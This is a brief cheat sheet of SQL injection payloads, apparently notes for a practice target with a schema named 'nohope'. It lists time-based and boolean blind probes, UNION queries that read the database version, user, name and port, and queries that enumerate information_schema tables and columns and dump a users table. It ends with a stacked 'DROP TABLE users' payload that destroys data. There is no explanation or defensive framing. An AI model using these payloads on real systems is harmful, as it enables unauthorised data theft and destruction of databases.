' or sleep(5)#
boolean' or 1=2# Blind

' UNION SELECT 1, version() #
' UNION SELECT 1, user() #
' UNION SELECT 1, database() #
' UNION SELECT 1, @@port #

'UNION select table_schema,null from
information_schema.tables ##

'UNION select table_name,null from
information_schema.tables where table_schema='nohope' #

'UNION select table_name,column_name from
information_schema.columns where table_name='users' #

' UNION select name, description from users #

' UNION SELECT * FROM users #
1' ; DROP TABLE users #